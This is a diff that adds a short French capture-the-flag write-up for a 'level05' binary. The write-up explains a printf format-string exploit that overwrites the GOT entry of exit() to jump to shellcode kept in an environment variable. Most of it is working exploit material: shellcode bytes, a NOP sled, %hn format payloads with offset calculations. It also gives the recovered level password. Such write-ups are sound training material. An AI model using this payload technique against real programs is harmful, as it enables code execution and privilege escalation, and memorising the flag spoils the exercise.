@@ -1,0 +1,30 @@
+
+Le programme lis sur stdin, fait un tolower(str), puis fait un printf(str). 
+On exploite le format string de printf pour override le got de exit().
+Le tolower() n affecte pas notre string:
+   - compile du /tmp/get
+   	$ python -c 'print "\x90"*4000 + "\x31\xc0\x50\x68\x2f\x67\x65\x74\x68\x2f\x74\x6d\x70\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"' > /tmp/exploit4k
+	$ export _SHELL="`cat /tmp/exploit4k`"
+	$ chmod 777 ./
+	$ echo -e -n "\xe0\x97\x04\x08\xe2\x97\x04\x08%53328x%10\$hn%12199x%11\$hn" > exploit
+	$ ./level05 < exploit
+	h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
+
+
+
+-------------------------------------
+override du exit:
+08048370 <exit@plt>:
+ 8048370:       ff 25 e0 97 04 08       jmp    *0x80497e0
+
+addresse shellcode:
+0xffffd058	4294955096  
+0xffff	d058
+65535	53336
+
+0x80497e0 + 0		53336 - 8 = 53328
+0x80497e0 + 2		65535 - 53336 = 12199
+11112222%5x%10$p%5x%11$p
+1111%5x%10$p 
+\xe0\x97\x04\x08\xe2\x97\x04\x08%53328x%10$hn%12199x%11$hn
+echo -e -n "\xe0\x97\x04\x08\xe2\x97\x04\x08%53328x%10\$hn%12199x%11\$hn"
